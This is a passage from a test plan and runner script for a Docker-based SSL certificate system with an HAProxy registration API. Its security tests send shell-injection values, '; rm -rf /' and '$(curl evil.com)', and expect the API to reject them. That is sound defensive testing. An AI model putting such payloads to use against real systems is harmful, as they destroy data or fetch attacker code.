    -e SSL_DOMAIN=unreachable.example.com \
    -e HAPROXY_HOST=haproxy-test \
    -e HAPROXY_API_PORT=8404 \
    -e SSL_TEST_MODE=0 \
    ssl-test-service:latest /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** Exit code 10 (domain unreachable). Error about domain not being reachable or DNS resolution failure.

**Verification:**
```bash
docker run --rm \
    --network test-haproxy-net \
    -e SSL_DOMAIN=unreachable.example.com \
    -e HAPROXY_HOST=haproxy-test \
    -e HAPROXY_API_PORT=8404 \
    -e SSL_TEST_MODE=0 \
    ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1
EXIT=$?
[[ $EXIT -eq 10 ]] && echo "PASS: exit code 10" || echo "FAIL: expected exit 10, got $EXIT"
```

#### Test 6.3: Certbot fails (invalid ACME server)

**Action:**
```bash
docker run --rm \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e ACME_SERVER=https://nonexistent:14000/dir \
    -e SSL_TEST_MODE=0 \
    ssl-test-service:latest /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** Exit code 11 (certbot failed). Error output references certbot failure or ACME server connection failure.

**Verification:**
```bash
docker run --rm \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e ACME_SERVER=https://nonexistent:14000/dir \
    -e SSL_TEST_MODE=0 \
    ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1
EXIT=$?
[[ $EXIT -eq 11 ]] && echo "PASS: exit code 11" || echo "FAIL: expected exit 11, got $EXIT"
```

#### Test 6.4: HAProxy API returns error on registration

When the HAProxy API is reachable but returns an error (e.g., 500), ssl-setup should fail.

**Action:**
```bash
# Start a mock that always returns 500
docker run -d --name mock-api \
    --network test-haproxy-net \
    python:3-slim python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(500)
        self.end_headers()
        self.wfile.write(b'{\"error\":\"internal\"}')
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{\"status\":\"healthy\",\"haproxy_pid\":1,\"api_version\":\"1.0\",\"backends_count\":0}')
http.server.HTTPServer(('0.0.0.0', 8404), H).serve_forever()
"

sleep 2

docker run --rm \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=mock-api \
    -e HAPROXY_API_PORT=8404 \
    ssl-test-service:latest /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** Exit code 13 (HAProxy registration failed). Error about registration failure.

**Cleanup:**
```bash
docker rm -f mock-api
```

#### Test 6.5: Port 80 already in use

When another process in the container holds port 80, ssl-setup should fail with a clear message.

**Action:**
```bash
docker run --rm \
    -e SSL_DOMAIN=test.local \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest sh -c '
        # Occupy port 80
        python3 -c "
import http.server
http.server.HTTPServer((\"0.0.0.0\", 80), http.server.BaseHTTPRequestHandler).serve_forever()
" &
        sleep 1
        /usr/local/bin/ssl-setup
        echo "Exit: $?"
    '
```

**Expected result:** ssl-setup detects port 80 is occupied and exits with a non-zero exit code and clear message about the port conflict.

---

### Test Suite 7: Non-HAProxy Mode (Direct)

These tests validate SSL works when there is no HAProxy involved -- the container handles its own ports 80 and 443 directly.

#### Test 7.1: Direct mode with SSL_TEST_MODE

**Action:**
```bash
docker run -d --name ssl-direct \
    -p 9080:80 -p 9443:443 \
    -e SSL_DOMAIN=test.local \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest
```

**Expected result:** Container starts. No HAProxy registration occurs. HTTPS is available on port 9443.

**Verification:**
```bash
sleep 3

# Verify no HAProxy registration attempted
docker logs ssl-direct 2>&1 | grep -i "haproxy"
# Expected: either no output, or "no HAPROXY_HOST set, skipping registration"

# Test HTTP
curl -sf http://localhost:9080/health
# Expected: {"status":"ok","ssl":false,...}

# Test HTTPS
curl -sk https://localhost:9443/health
# Expected: {"status":"ok","ssl":true,...}
```

**Cleanup:**
```bash
docker rm -f ssl-direct
```

#### Test 7.2: Direct mode without SSL_DOMAIN (HTTP only)

**Action:**
```bash
docker run -d --name ssl-direct-nossl \
    -p 9080:80 \
    -e SSL_DOMAIN="" \
    ssl-test-service:latest
```

**Expected result:** Container starts with HTTP only. No SSL setup attempted.

**Verification:**
```bash
sleep 2

# HTTP works
curl -sf http://localhost:9080/health
# Expected: {"status":"ok","ssl":false,...}

# HTTPS is not available
curl -sk https://localhost:9443/health 2>&1
# Expected: connection refused or failure

# Logs confirm SSL skipped
docker logs ssl-direct-nossl 2>&1 | grep -i "skip\|no.*domain\|ssl not configured"
```

**Cleanup:**
```bash
docker rm -f ssl-direct-nossl
```

#### Test 7.3: Direct mode skips HAProxy registration when HAPROXY_HOST is empty

**Action:**
```bash
docker run --rm \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST="" \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1
```

**Expected result:** Exit code 0. Output does NOT contain any HAProxy registration attempt.

**Verification:**
```bash
OUTPUT=$(docker run --rm \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST="" \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1)
EXIT=$?
[[ $EXIT -eq 0 ]] && echo "PASS: exit 0" || echo "FAIL: exit $EXIT"
echo "$OUTPUT" | grep -iqE "register.*haproxy|POST.*backend"
[[ $? -ne 0 ]] && echo "PASS: no HAProxy registration" || echo "FAIL: registration was attempted"
```

---

### Test Suite 8: Race Conditions and Concurrency

These tests validate correct behavior under concurrent access and timing-sensitive scenarios.

**Precondition:** HAProxy is running and healthy on `test-haproxy-net`.

#### Test 8.1 (T-RACE-1): HAProxy restart during registration

**Action:**
```bash
test_haproxy_restart_during_registration() {
    # Start HAProxy
    docker rm -f haproxy-test 2>/dev/null || true
    docker run -d --name haproxy-test \
        --network test-haproxy-net \
        --restart on-failure:5 \
        -p 8080:80 -p 8443:443 -p 8404:8404 \
        haproxy-api:test
    wait_for_url "http://localhost:8404/v1/health" 30

    # Begin ssl-setup in test service (background)
    docker run --rm --name ssl-race-test \
        --network test-haproxy-net \
        -e SSL_DOMAIN=race.test \
        -e HAPROXY_HOST=haproxy-test \
        -e HAPROXY_API_PORT=8404 \
        -e SSL_TEST_MODE=1 \
        ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1 &
    SETUP_PID=$!
    sleep 1

    # Kill HAProxy mid-registration
    docker kill haproxy-test

    # Wait for ssl-setup to finish
    wait $SETUP_PID
    EXIT=$?

    # Verify ssl-setup detects failure and exits with code 13
    [[ $EXIT -eq 13 ]] && echo "PASS: exit code 13" || echo "FAIL: expected exit 13, got $EXIT"
}
```

**Expected result:** ssl-setup detects HAProxy is gone mid-registration and exits with code 13 (HAProxy registration failed).

#### Test 8.2 (T-RACE-2): Concurrent same-domain registration

**Action:**
```bash
test_concurrent_same_domain_registration() {
    # Fire two simultaneous POST /v1/backends with same domain, different containers
    curl -s -o /tmp/race-a.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"race.example.com","container":"service-a","http_port":80,"https_port":443}' &
    PID_A=$!

    curl -s -o /tmp/race-b.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"race.example.com","container":"service-b","http_port":80,"https_port":443}' &
    PID_B=$!

    wait $PID_A; CODE_A=$?
    wait $PID_B; CODE_B=$?

    HTTP_A=$(tail -1 /tmp/race-a.json)
    HTTP_B=$(tail -1 /tmp/race-b.json)

    # Verify exactly one gets 201, the other gets 409
    if { [[ "$HTTP_A" == "201" && "$HTTP_B" == "409" ]] || \
         [[ "$HTTP_A" == "409" && "$HTTP_B" == "201" ]]; }; then
        echo "PASS: one 201, one 409"
    else
        echo "FAIL: expected one 201 + one 409, got A=$HTTP_A B=$HTTP_B"
    fi

    # Verify domains.map has exactly one entry for this domain
    COUNT=$(docker exec haproxy-test grep -c 'race.example.com' \
        /etc/haproxy/maps/http-domains.map 2>/dev/null || echo 0)
    [[ "$COUNT" == "1" ]] && echo "PASS: exactly one map entry" || echo "FAIL: found $COUNT entries"

    # Cleanup
    curl -s -X DELETE http://localhost:8404/v1/backends/race.example.com >/dev/null 2>&1
}
```

**Expected result:** Exactly one request gets 201 Created, the other gets 409 Conflict. The domains map contains exactly one entry for the domain.

#### Test 8.3 (T-RACE-3): Concurrent different-domain registration

**Action:**
```bash
test_concurrent_different_domain_registration() {
    # Fire two simultaneous POST /v1/backends with different domains
    curl -s -o /tmp/race-c.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"alpha.example.com","container":"service-alpha","http_port":80,"https_port":443}' &
    PID_C=$!

    curl -s -o /tmp/race-d.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"beta.example.com","container":"service-beta","http_port":80,"https_port":443}' &
    PID_D=$!

    wait $PID_C
    wait $PID_D

    HTTP_C=$(tail -1 /tmp/race-c.json)
    HTTP_D=$(tail -1 /tmp/race-d.json)

    # Verify both get 201
    [[ "$HTTP_C" == "201" && "$HTTP_D" == "201" ]] \
        && echo "PASS: both 201" \
        || echo "FAIL: expected both 201, got C=$HTTP_C D=$HTTP_D"

    # Verify domains.map has both entries
    MAP=$(docker exec haproxy-test cat /etc/haproxy/maps/http-domains.map 2>/dev/null)
    echo "$MAP" | grep -q 'alpha.example.com' && echo "$MAP" | grep -q 'beta.example.com' \
        && echo "PASS: both domains in map" \
        || echo "FAIL: missing domain in map"

    # Verify HAProxy config is valid
    docker exec haproxy-test haproxy -c -f /etc/haproxy/haproxy.cfg >/dev/null 2>&1
    [[ $? -eq 0 ]] && echo "PASS: HAProxy config valid" || echo "FAIL: HAProxy config invalid"

    # Cleanup
    curl -s -X DELETE http://localhost:8404/v1/backends/alpha.example.com >/dev/null 2>&1
    curl -s -X DELETE http://localhost:8404/v1/backends/beta.example.com >/dev/null 2>&1
}
```

**Expected result:** Both requests get 201 Created. Both domains appear in the map. HAProxy config validates cleanly.

#### Test 8.4 (T-RACE-4): Registration during config generation

**Action:**
```bash
test_registration_during_config_generation() {
    # Register domain A
    curl -s -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"first.example.com","container":"service-first","http_port":80,"https_port":443}'

    # Immediately register domain B (while generate-config.sh may still be running for A)
    curl -s -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"second.example.com","container":"service-second","http_port":80,"https_port":443}'

    # Wait for config generation to settle
    sleep 2

    # Verify both succeed (file locking serializes them)
    RESPONSE=$(curl -s http://localhost:8404/v1/backends)
    echo "$RESPONSE" | jq -r '.backends[].domain' | grep -q 'first.example.com' \
        && echo "PASS: first domain registered" \
        || echo "FAIL: first domain missing"
    echo "$RESPONSE" | jq -r '.backends[].domain' | grep -q 'second.example.com' \
        && echo "PASS: second domain registered" \
        || echo "FAIL: second domain missing"

    # Verify final config contains both domains
    CONFIG=$(docker exec haproxy-test cat /etc/haproxy/conf.d/20-backends.cfg 2>/dev/null)
    echo "$CONFIG" | grep -q 'service-first' && echo "$CONFIG" | grep -q 'service-second' \
        && echo "PASS: both backends in config" \
        || echo "FAIL: missing backend in config"

    # Cleanup
    curl -s -X DELETE http://localhost:8404/v1/backends/first.example.com >/dev/null 2>&1
    curl -s -X DELETE http://localhost:8404/v1/backends/second.example.com >/dev/null 2>&1
}
```

**Expected result:** Both registrations succeed. File locking serializes config generation. Final config contains both domains.

---

### Test Suite 9: Failure Recovery

These tests validate that the system recovers gracefully from component failures.

#### Test 9.1 (T-FAIL-1): API process crash recovery

**Action:**
```bash
test_api_crash_recovery() {
    # Kill the Python API process inside HAProxy container
    docker exec haproxy-test pkill -f registration-api.py
    # Wait 3 seconds for restart loop
    sleep 3
    # Verify API is back: GET /v1/health returns 200
    curl -sf http://haproxy-test:8404/v1/health
}
```

**Expected result:** The API process restarts automatically after being killed. Health check returns 200 within 3 seconds.

**Verification:**
```bash
docker exec haproxy-test pkill -f registration-api.py
sleep 3
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8404/v1/health)
[[ "$HTTP_CODE" == "200" ]] && echo "PASS: API recovered" || echo "FAIL: got $HTTP_CODE"
```

#### Test 9.2 (T-FAIL-2): Corrupt domains.map handling

**Action:**
```bash
test_corrupt_domains_map() {
    # Write garbage to domains.map
    docker exec haproxy-test sh -c 'echo "GARBAGE LINE" > /etc/haproxy/state/domains.map'
    # Call POST /v1/reload
    HTTP_CODE=$(curl -s -o /tmp/corrupt-reload.json -w '%{http_code}' \
        -X POST http://localhost:8404/v1/reload)
    # Verify API returns 500 with error message
    [[ "$HTTP_CODE" == "500" ]] && echo "PASS: 500 on corrupt map" || echo "FAIL: got $HTTP_CODE"
    # Verify HAProxy continues serving with previous config (rollback)
    docker exec haproxy-test haproxy -c -f /etc/haproxy/haproxy.cfg >/dev/null 2>&1
    [[ $? -eq 0 ]] && echo "PASS: HAProxy config still valid (rollback)" || echo "FAIL: HAProxy config broken"
}
```

**Expected result:** API returns HTTP 500 with an error message about the corrupt map. HAProxy continues serving with the previous valid configuration (rollback).

#### Test 9.3 (T-FAIL-3): SSL_REQUIRED=false fallback

**Action:**
```bash
test_ssl_required_false_fallback() {
    # Start test service with SSL_DOMAIN=invalid.test SSL_REQUIRED=false
    docker rm -f ssl-fallback-test 2>/dev/null || true
    docker run -d --name ssl-fallback-test \
        --network test-haproxy-net \
        -p 9180:80 \
        -e SSL_DOMAIN=invalid.test \
        -e SSL_REQUIRED=false \
        -e SSL_TEST_MODE=0 \
        ssl-test-service:latest

    sleep 5

    # ssl-setup should fail certbot but container should stay up
    docker inspect -f '{{.State.Running}}' ssl-fallback-test | grep -q true
    [[ $? -eq 0 ]] && echo "PASS: container still running" || echo "FAIL: container exited"

    # Verify service is running on TCP only (no SSL)
    curl -sf http://localhost:9180/health >/dev/null
    [[ $? -eq 0 ]] && echo "PASS: HTTP serving" || echo "FAIL: HTTP not available"

    # Verify WARNING in container logs
    docker logs ssl-fallback-test 2>&1 | grep -iqE "warn|fallback|ssl.*fail"
    [[ $? -eq 0 ]] && echo "PASS: warning in logs" || echo "FAIL: no warning in logs"
}
```

**Expected result:** Container stays running despite SSL failure. Service is available on HTTP (TCP only). Container logs contain a WARNING about the SSL failure and fallback behavior.

**Cleanup:**
```bash
docker rm -f ssl-fallback-test 2>/dev/null || true
```

---

### Test Suite 10: Security

These tests validate input sanitization and network security boundaries.

#### Test 10.1 (T-SEC-1): Shell injection via domain

**Action:**
```bash
test_shell_injection_domain() {
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://haproxy-test:8404/v1/backends \
        -H "Content-Type: application/json" \
        -d '{"domain":"; rm -rf /","container":"evil","http_port":80}')
    assert_equals "422" "$RESPONSE"
}
```

**Expected result:** HTTP 422 Unprocessable Entity. The malicious domain is rejected by input validation.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:8404/v1/backends \
    -H "Content-Type: application/json" \
    -d '{"domain":"; rm -rf /","container":"evil","http_port":80}')
[[ "$HTTP_CODE" == "422" ]] && echo "PASS: shell injection rejected" || echo "FAIL: got $HTTP_CODE"
```

#### Test 10.2 (T-SEC-2): Shell injection via container name

**Action:**
```bash
test_shell_injection_container() {
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://haproxy-test:8404/v1/backends \
        -H "Content-Type: application/json" \
        -d '{"domain":"safe.com","container":"$(curl evil.com)","http_port":80}')
    assert_equals "422" "$RESPONSE"
}
```

**Expected result:** HTTP 422 Unprocessable Entity. The malicious container name is rejected by input validation.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:8404/v1/backends \
    -H "Content-Type: application/json" \
    -d '{"domain":"safe.com","container":"$(curl evil.com)","http_port":80}')
[[ "$HTTP_CODE" == "422" ]] && echo "PASS: shell injection rejected" || echo "FAIL: got $HTTP_CODE"
```

#### Test 10.3 (T-SEC-3): API not accessible from outside Docker network

**Action:**
```bash
test_api_not_externally_accessible() {
    # Port 8404 should NOT be published to the host in production
    # Attempt to connect from host should fail
    ! curl -sf --max-time 2 http://localhost:8404/v1/health
}
```

**Expected result:** Connection fails or times out. The API port (8404) is not published to the host in production deployments. Note: in test environments the port IS published for testing convenience; this test validates the production docker-compose configuration.

**Verification:**
```bash
# Check the production docker-compose does NOT publish port 8404
grep -q '8404:8404' docker/docker-compose.yml 2>/dev/null \
    && echo "FAIL: port 8404 published in production compose" \
    || echo "PASS: port 8404 not published in production"
```

---

### Test Suite 11: Certificate Lifecycle

These tests validate certificate persistence, reuse, and renewal across container restarts.

**Precondition:** The `letsencrypt-data` volume must be used for certificate storage.

#### Test 11.1 (T-CERT-1): Existing cert reuse on restart

**Action:**
```bash
test_cert_reuse_on_restart() {
    # Start with SSL, get cert
    docker rm -f ssl-cert-test 2>/dev/null || true
    docker volume create letsencrypt-data 2>/dev/null || true
    docker run -d --name ssl-cert-test \
        --network test-haproxy-net \
        -e SSL_DOMAIN=cert.test \
        -e SSL_TEST_MODE=1 \
        -v letsencrypt-data:/etc/letsencrypt \
        ssl-test-service:latest
    sleep 5

    # Stop container
    docker stop ssl-cert-test
    docker rm ssl-cert-test

    # Start again (same letsencrypt-data volume)
    docker run -d --name ssl-cert-test \
        --network test-haproxy-net \
        -e SSL_DOMAIN=cert.test \
        -e SSL_TEST_MODE=1 \
        -v letsencrypt-data:/etc/letsencrypt \
        ssl-test-service:latest
    sleep 5

    # Verify certbot was NOT called (check logs for "Using existing certificate")
    docker logs ssl-cert-test 2>&1 | grep -iqE "existing.*cert|reuse|skip.*certbot|already.*exists"
    [[ $? -eq 0 ]] && echo "PASS: cert reused" || echo "FAIL: cert not reused"

    # Verify SSL works
    docker exec ssl-cert-test curl -sk https://localhost:443/health | jq -r '.ssl' | grep -q 'true'
    [[ $? -eq 0 ]] && echo "PASS: SSL works after restart" || echo "FAIL: SSL broken after restart"
}
```

**Expected result:** On second start, the container detects existing certificates in the `letsencrypt-data` volume and reuses them without calling certbot. SSL serves correctly.

**Cleanup:**
```bash
docker rm -f ssl-cert-test 2>/dev/null || true
docker volume rm letsencrypt-data 2>/dev/null || true
```

#### Test 11.2 (T-CERT-2): Expired cert triggers re-acquisition

**Action:**
```bash
test_expired_cert_renewal() {
    # Create an expired cert in the letsencrypt volume (using openssl)
    docker volume create letsencrypt-data 2>/dev/null || true
    docker run --rm -v letsencrypt-data:/etc/letsencrypt alpine sh -c '
        mkdir -p /etc/letsencrypt/live/expired.test
        # Generate a certificate that expired yesterday
        apk add --no-cache openssl >/dev/null 2>&1
        openssl req -x509 -newkey rsa:2048 \
            -keyout /etc/letsencrypt/live/expired.test/privkey.pem \
            -out /etc/letsencrypt/live/expired.test/fullchain.pem \
            -days -1 -nodes -subj "/CN=expired.test" 2>/dev/null
    '

    # Start container with SSL_DOMAIN
    docker rm -f ssl-expired-test 2>/dev/null || true
    docker run -d --name ssl-expired-test \
        --network test-haproxy-net \
        -e SSL_DOMAIN=expired.test \
        -e SSL_TEST_MODE=1 \
        -v letsencrypt-data:/etc/letsencrypt \
        ssl-test-service:latest
    sleep 5

    # Verify certbot runs to get new cert (or ssl-setup detects expiry)
    docker logs ssl-expired-test 2>&1 | grep -iqE "expir|renew|new cert|certbot"
    [[ $? -eq 0 ]] && echo "PASS: expired cert triggered renewal" || echo "FAIL: no renewal detected"
}
```

**Expected result:** ssl-setup detects the expired certificate and triggers re-acquisition (either via certbot or by generating a new self-signed cert in test mode).

**Cleanup:**
```bash
docker rm -f ssl-expired-test 2>/dev/null || true
docker volume rm letsencrypt-data 2>/dev/null || true
```

---

## 5. Mock ACME Server (Pebble)

[Pebble](https://github.com/letsencrypt/pebble) is Let's Encrypt's official test ACME server. It enables testing the full certbot flow without a publicly reachable domain.

### Running Pebble

Pebble is included in `docker-compose.test.yml`. To run it standalone:

```bash
docker run -d --name pebble \
    --network test-haproxy-net \
    -e PEBBLE_VA_NOSLEEP=1 \
    -e PEBBLE_VA_ALWAYS_VALID=1 \
    -e PEBBLE_WFE_NONCEREJECT=0 \
    -p 14000:14000 \
    -p 15000:15000 \
    letsencrypt/pebble:latest \
    pebble -config /test/config/pebble-config.json -strict
```

### Key Environment Variables

| Variable | Value | Effect |
|---|---|---|
| `PEBBLE_VA_NOSLEEP` | `1` | Skip challenge validation delays |
| `PEBBLE_VA_ALWAYS_VALID` | `1` | Accept all challenges as valid (no actual HTTP-01 check) |
| `PEBBLE_WFE_NONCEREJECT` | `0` | Do not reject nonces (reduces flaky failures) |

### Using Pebble with certbot

```bash
certbot certonly \
    --webroot --webroot-path /var/www/acme-challenge \
    --server https://pebble:14000/dir \
    --no-verify-ssl \
    --agree-tos \
    --register-unsafely-without-email \
    -d test.local
```

### Pebble CA Certificate

To verify certificates issued by pebble without `-k`:

```bash
# Extract pebble's root CA
curl -sk https://pebble:15000/roots/0 > /tmp/pebble-ca.crt

# Use it for verification
curl -s --cacert /tmp/pebble-ca.crt https://test.local:443/health
```

### Limitations

- Pebble issues certificates with very short validity (by default, 5 years -- configurable)
- `PEBBLE_VA_ALWAYS_VALID=1` skips actual HTTP-01 challenge verification; set to `0` to test real challenge flow (requires pebble-challtestsrv or actual reachability)
- Pebble's CA is not trusted by system roots -- always use `--no-verify-ssl` with certbot or provide the CA cert

### Real HTTP-01 Challenge Test

**Important:** At least one test in Suite 4 should run with `PEBBLE_VA_ALWAYS_VALID=0` to exercise the real HTTP-01 challenge flow through HAProxy. This validates that HAProxy correctly proxies the `/.well-known/acme-challenge/` path to the service container.

#### Test 4.4: Real HTTP-01 challenge flow (PEBBLE_VA_ALWAYS_VALID=0)

**Precondition:** Restart pebble with validation enabled:
```bash
docker rm -f pebble 2>/dev/null || true
docker run -d --name pebble \
    --network test-haproxy-net \
    -e PEBBLE_VA_NOSLEEP=1 \
    -e PEBBLE_VA_ALWAYS_VALID=0 \
    -e PEBBLE_WFE_NONCEREJECT=0 \
    -p 14000:14000 \
    -p 15000:15000 \
    letsencrypt/pebble:latest \
    pebble -config /test/config/pebble-config.json -strict
sleep 3
```

**Action:**
```bash
docker compose -f docker-compose.test.yml run --rm \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=haproxy-test \
    -e HAPROXY_API_PORT=8404 \
    -e ACME_SERVER=https://pebble:14000/dir \
    -e REQUESTS_CA_BUNDLE=/etc/ssl/certs/pebble-ca.crt \
    ssl-test-service
```

**Expected result:** Exit code 0. Pebble validates the HTTP-01 challenge by making a real HTTP request through HAProxy to the service container. Certificate is obtained successfully.

**Verification:**
```bash
# From another terminal, while the service is running:
curl -sk --resolve test.local:8443:127.0.0.1 https://test.local:8443/health
# Expected: {"status":"ok","ssl":true,...}

# Verify certificate was issued by pebble
echo | openssl s_client -connect localhost:8443 -servername test.local 2>/dev/null \
    | openssl x509 -noout -issuer
# Expected: issuer contains "Pebble"
```

---

## 6. Test Runner Script

### Structure

Place this at `docker/tests/test-ssl-system.sh`:

```bash
#!/bin/bash
# =============================================================================
# SSL Management System -- Test Runner
# =============================================================================
#
# Usage:
#   ./test-ssl-system.sh              # Run all test suites
#   ./test-ssl-system.sh --suite 2    # Run only suite 2
#   ./test-ssl-system.sh --verbose    # Show all output
#   ./test-ssl-system.sh --no-cleanup # Keep containers after tests
#
# Exit codes:
#   0 -- all tests passed
#   1 -- one or more tests failed
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
VERBOSE="${VERBOSE:-0}"
CLEANUP="${CLEANUP:-1}"
SUITE_FILTER="${SUITE_FILTER:-all}"
NETWORK="test-haproxy-net"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS_COUNT=0
FAIL_COUNT=0
SKIP_COUNT=0
FAILURES=()

# ---- Utilities ----

log()  { echo -e "${BOLD}[test]${NC} $*"; }
pass() { echo -e "  ${GREEN}PASS${NC}: $1"; PASS_COUNT=$((PASS_COUNT + 1)); }
fail() { echo -e "  ${RED}FAIL${NC}: $1 -- $2"; FAIL_COUNT=$((FAIL_COUNT + 1)); FAILURES+=("$1: $2"); }
skip() { echo -e "  ${YELLOW}SKIP${NC}: $1"; SKIP_COUNT=$((SKIP_COUNT + 1)); }

wait_for_url() {
    local url="$1" max="${2:-30}"
    for i in $(seq 1 "$max"); do
        curl -sf "$url" >/dev/null 2>&1 && return 0
        sleep 1
    done
    return 1
}

wait_for_container() {
    local name="$1" max="${2:-30}"
    for i in $(seq 1 "$max"); do
        docker inspect -f '{{.State.Running}}' "$name" 2>/dev/null | grep -q true && return 0
        sleep 1
    done
    return 1
}

container_running() {
    docker inspect -f '{{.State.Running}}' "$1" 2>/dev/null | grep -q true
}

# ---- Cleanup ----

cleanup() {
    if [[ "$CLEANUP" == "0" ]]; then
        log "Skipping cleanup (--no-cleanup)"
        return
    fi
    log "Cleaning up..."
    docker rm -f ssl-test-service ssl-test-service-2 ssl-test-selfsigned \
        ssl-test-renew ssl-direct ssl-direct-nossl haproxy-test mock-api \
        pebble pebble-challtestsrv ssl-race-test ssl-fallback-test \
        ssl-cert-test ssl-expired-test 2>/dev/null || true
    docker volume rm letsencrypt-data 2>/dev/null || true
    docker network rm "$NETWORK" 2>/dev/null || true
    rm -rf /tmp/ssl-test-certs /tmp/register.json /tmp/get-backend.json \
        /tmp/conflict.json /tmp/pebble-ca.crt /tmp/idempotent.json \
        /tmp/race-a.json /tmp/race-b.json /tmp/race-c.json /tmp/race-d.json \
        /tmp/corrupt-reload.json 2>/dev/null || true
    log "Cleanup complete"
}

trap cleanup EXIT

# ---- Parse args ----

while [[ $# -gt 0 ]]; do
    case "$1" in
        --suite)   SUITE_FILTER="$2"; shift 2 ;;
        --verbose) VERBOSE=1; shift ;;
        --no-cleanup) CLEANUP=0; shift ;;
        *) echo "Unknown arg: $1"; exit 1 ;;
    esac
done

# ---- Setup ----

setup() {
    log "Creating test network..."
    docker network create "$NETWORK" 2>/dev/null || true
}

# ---- Suite 1: ssl-manager Base Image ----

suite_1() {
    log ""
    log "========================================"
    log "Suite 1: ssl-manager Base Image"
    log "========================================"

    # 1.1 Build
    if docker images ssl-manager:latest --format '{{.Repository}}' | grep -q ssl-manager; then
        pass "1.1 ssl-manager image exists"
    else
        log "Building ssl-manager..."
        if docker build -t ssl-manager:latest -f "$SCRIPT_DIR/../Dockerfile.ssl-manager" "$SCRIPT_DIR/.."; then
            pass "1.1 ssl-manager image builds"
        else
            fail "1.1 ssl-manager image build" "docker build failed"
            return
        fi
    fi

    # 1.2 Certbot
    if docker run --rm ssl-manager:latest certbot --version 2>&1 | grep -qE 'certbot [0-9]+\.'; then
        pass "1.2 certbot is present"
    else
        fail "1.2 certbot" "certbot --version failed"
    fi

    # 1.3 SSL utilities
    for tool in openssl curl jq nc; do
        if docker run --rm ssl-manager:latest which "$tool" >/dev/null 2>&1; then
            pass "1.3 $tool is present"
        else
            fail "1.3 $tool" "not found in image"
        fi
    done

    # 1.4 ssl-setup script
    if docker run --rm ssl-manager:latest test -x /usr/local/bin/ssl-setup; then
        pass "1.4 ssl-setup is executable"
    else
        fail "1.4 ssl-setup" "not executable or missing"
    fi

    # 1.5 No SSL_DOMAIN
    if docker run --rm -e SSL_DOMAIN="" ssl-manager:latest /usr/local/bin/ssl-setup 2>&1; then
        pass "1.5 no SSL_DOMAIN exits cleanly"
    else
        fail "1.5 no SSL_DOMAIN" "non-zero exit"
    fi

    # 1.6 Invalid SSL_DOMAIN
    if docker run --rm -e SSL_DOMAIN="not a valid domain!!!" -e HAPROXY_HOST="" -e SSL_TEST_MODE=0 \
        ssl-manager:latest /usr/local/bin/ssl-setup 2>&1; then
        fail "1.6 invalid SSL_DOMAIN" "expected non-zero exit but got 0"
    else
        pass "1.6 invalid SSL_DOMAIN exits non-zero"
    fi
}

# ---- Suite 2: HAProxy Registration API ----

suite_2() {
    log ""
    log "========================================"
    log "Suite 2: HAProxy Registration API"
    log "========================================"

    # Start HAProxy
    log "Starting HAProxy with registration API..."
    docker rm -f haproxy-test 2>/dev/null || true
    docker run -d --name haproxy-test \
        --network "$NETWORK" \
        -p 8080:80 -p 8443:443 -p 8404:8404 \
        haproxy-api:test

    if ! wait_for_url "http://localhost:8404/v1/health" 30; then
        fail "2.1 API health" "HAProxy API did not become ready in 30s"
        return
    fi
    local HEALTH_STATUS
    HEALTH_STATUS=$(curl -sf http://localhost:8404/v1/health | jq -r '.status' 2>/dev/null || echo "")
    if [[ "$HEALTH_STATUS" == "healthy" ]]; then
        pass "2.1 API health check responds with status=healthy"
    else
        fail "2.1 API health" "expected status=healthy, got status=$HEALTH_STATUS"
    fi

    # 2.2 Register
    local HTTP_CODE
    HTTP_CODE=$(curl -s -o /tmp/register.json -w '%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}')
    [[ "$HTTP_CODE" == "201" ]] \
        && pass "2.2 register backend (201)" \
        || fail "2.2 register backend" "expected 201, got $HTTP_CODE"

    # 2.3 List (canonical format: {"backends":[...],"count":N})
    if curl -s http://localhost:8404/v1/backends | jq -r '.backends[].domain' | grep -q 'test.example.com'; then
        pass "2.3 list backends includes domain"
    else
        fail "2.3 list backends" "domain not found in list"
    fi

